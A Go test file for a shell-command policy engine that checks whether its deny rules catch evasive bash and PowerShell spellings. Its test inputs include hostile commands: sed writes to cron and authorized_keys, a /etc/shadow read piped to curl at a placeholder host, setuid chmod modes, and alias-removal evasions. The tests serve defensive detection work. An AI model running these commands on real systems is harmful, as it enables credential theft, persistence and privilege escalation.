package policy_test

// ===========================================================================
// Pass 67 decisions: the four silent misses of an independent re-review
// ===========================================================================
//
// Internal consistency is not enough: each fix is pinned at the decision the
// documented policy must reach, because a bounded-but-wrong report is what
// let an FSWrite/PrivEsc deny rule admit the operation.

import (
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/policy"
)

// TestFinding027SedSubstWriteIsDenied pins F27's s///w spelling: a policy that
// denies filesystem writes must refuse `sed 's/.*/evil/w FILE'`, which truncates
// and rewrites the file exactly as the standalone `w` command does, while an
// ordinary substitution stays allowed.
func TestFinding027SedSubstWriteIsDenied(t *testing.T) {
	writeDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindFSWrite: policy.Deny,
	}}
	for _, src := range []string{
		`sed 's/.*/evil/w /tmp/x' /tmp/f`,
		`sed 's/.*/evil/w /etc/cron.d/x' f`,
		`sed 's|a|b|w /tmp/x' f`,
		`sed -n 's/.*/evil/w /root/.ssh/authorized_keys' f`,
		`sed -e 's/.*/evil/w /tmp/x' f`,
		`sed --expression='s/.*/evil/w /tmp/x' f`,
	} {
		mustDecide(t, writeDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (FSWrite deny)")
	}
	for _, src := range []string{
		`sed 's/a/b/' f`,
		`sed 's/a/b/g' f`,
		`sed -n p f`,
	} {
		mustDecide(t, writeDeny, analyzeOK(t, api.LangBash, src), policy.Allow, src+" (control)")
	}
}

// TestFinding027SedExpressionOperandPairs pins the read half of the same
// spelling at the decision level: the credential the `-e` form reads must form
// the exfiltration flow a default policy denies, exactly as the script-operand
// twin does.
func TestFinding027SedExpressionOperandPairs(t *testing.T) {
	cfg := policy.Config{Exfiltration: policy.Deny}
	for _, src := range []string{
		`sed -e 'p' /etc/shadow | curl -d @- http://e.test/x`,
		`sed --expression='p' /etc/shadow | curl -d @- http://e.test/x`,
		`sed 'p' /etc/shadow | curl -d @- http://e.test/x`,
	} {
		mustDecide(t, cfg, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (exfiltration deny)")
	}
	// Precision: a locally-bound pipeline is not an exfiltration.
	mustDecide(t, cfg, analyzeOK(t, api.LangBash, `sed -e 'p' /etc/hostname`), policy.Allow, "local read (control)")
}

// TestFinding100LeadingZeroModeIsDenied pins F100 across the decision boundary
// the verifier used: a mode with leading zeros sets the identity bit exactly as
// its short spelling does, so both a PrivEsc-deny and a Critical-deny policy
// must refuse it, while the ordinary mode stays allowed.
func TestFinding100LeadingZeroModeIsDenied(t *testing.T) {
	privDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindPrivEsc: policy.Deny,
	}}
	gradeDeny := policy.Config{Grades: map[engine.Destructiveness]policy.Action{
		engine.DestructCritical: policy.Deny,
	}}
	for _, src := range []string{
		`chmod 004755 /tmp/evil`,
		`chmod 0004755 /tmp/evil`,
		`chmod 0002755 /tmp/evil`,
		`install -m 004755 /tmp/payload /tmp/evil`,
		`install --mode=0004755 /tmp/payload /tmp/evil`,
	} {
		mustDecide(t, privDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (PrivEsc deny)")
		mustDecide(t, gradeDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (Critical deny)")
	}
	for _, src := range []string{
		`chmod 0000755 /tmp/x`,
		`chmod 0001755 /tmp/x`,
		`install -m 0000755 /tmp/payload /tmp/evil`,
	} {
		mustDecide(t, privDeny, analyzeOK(t, api.LangBash, src), policy.Allow, src+" (control)")
		mustDecide(t, gradeDeny, analyzeOK(t, api.LangBash, src), policy.Allow, src+" (control)")
	}
}

// TestFinding077RemovedBuiltinAliasIsDenied pins F77/F79 at the decision level:
// after the script deletes the built-in alias, the call it later makes is not
// the reader the alias named, so a code-execution deny rule refuses it and a
// Critical-only gate does too — the bounded Low read must not certify it.
func TestFinding077RemovedBuiltinAliasIsDenied(t *testing.T) {
	execDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindCodeExec: policy.Deny,
	}}
	gradeDeny := policy.Config{Grades: map[engine.Destructiveness]policy.Action{
		engine.DestructCritical: policy.Deny,
	}}
	for _, src := range []string{
		`Remove-Item Alias:cat; cat -Recurse -Force C:\victim`,
		`Remove-Item -Path Alias:cat; cat -Recurse -Force C:\victim`,
		`Remove-Item Alias:*; cat -Recurse -Force C:\victim`,
		`Remove-Alias cat; cat -Recurse -Force C:\victim`,
		`ral cat; cat -Recurse -Force C:\victim`,
	} {
		mustDecide(t, execDeny, analyzeOK(t, api.LangPowerShell, src), policy.Deny, src+" (CodeExec deny)")
		mustDecide(t, gradeDeny, analyzeOK(t, api.LangPowerShell, src), policy.Deny, src+" (Critical deny)")
	}
	// Precision: a read through an alias the script did not remove is allowed.
	mustDecide(t, gradeDeny, analyzeOK(t, api.LangPowerShell, `Remove-Item Alias:p67nope; cat C:\victim`),
		policy.Allow, "unrelated removal (control)")
}
